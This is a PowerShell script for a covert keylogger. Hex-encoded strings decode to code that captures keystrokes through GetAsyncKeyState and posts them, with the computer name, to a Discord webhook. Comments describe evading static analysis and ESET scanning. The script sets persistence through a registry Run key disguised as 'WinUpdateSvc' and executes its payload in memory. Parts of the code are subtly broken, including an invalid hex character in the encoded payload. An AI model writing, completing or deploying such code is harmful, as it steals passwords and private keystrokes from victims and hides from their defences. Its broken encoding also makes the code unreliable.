# Configuration
$W = "https://discord.com/api/webhooks/1504038539984113755/-YlOeox0lAsJLUETBjQImcHlD7PzbLacAjOetUX3pNDhkDBGkGZn4oGM-vGmnl_5LMHX"
$K = "WinUpdateSvc"

# The logic is fragmented into hex strings to evade static analysis
$h1 = "4164642d54797065202d5479706520277573696e672053797374656d3b7573696e672053797374656d2e52756e74696d652e496e7465726f7053657276696365733b7075626c696320636c617373204b7b5b446c6c496d706f727428227573657233322e646c6c22295d7075626c6963207374617469632065787465726e2073686f7274204765744173796e634b6579537461746528696e742076293b7d273b"
$h2 = "244c3d27273b7768696c652831297b53746172742d536c656570202d6d2035303b666f722824693d383b2469202d6c65203139303b24692b2b297b6966285b4b5d3a3a4765744173796e634b6579537461746528246929202d6571202d3332373637297b244c2b3d5b636861725d24693b696628244c2e4c656e677468202d6765203230297b24703d407b757365726e616d653d24656e763a434f4d50555445524e414d453b636f6e74656e743d244c7d7c436f6e76657274546f2d4a736f6e3b496e766f6b652d526573744d657t686f64202d5572692027"
$h3 = "27202d4d6574686f6420506f7374202d426f6479202470202d436f6e74656e745479706520276170706c69636174696f6e2f6a736f6e273b244c3d27277d7d7d7d"

# Reassemble in memory
$FullHex = $h1 + $h2 + $W.ToCharArray() | ForEach-Object { [System.Convert]::ToString([int]$_, 16) } -join "" + $h3
$Core = $FullHex -split '(..)' | ? { $_ } | % { [char][Convert]::ToInt32($_, 16) } -join ""

# Persistence via Registry but as a Base64 string to avoid ESET's file scanner
$B64 = [Convert]::ToBase64String([System.Text.Encoding]::ASCII.GetBytes($Core))
$RegPath = "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run"
New-ItemProperty -Path $RegPath -Name $K -Value "powershell.exe -WindowStyle Hidden -NoProfile -ExecutionPolicy Bypass -Command `"[System.Text.Encoding]::ASCII.GetString([System.Convert]::FromBase64String('$B64')) | iex`"" -PropertyType String -Force

# Immediate Execution (In-memory)
$Core | iex
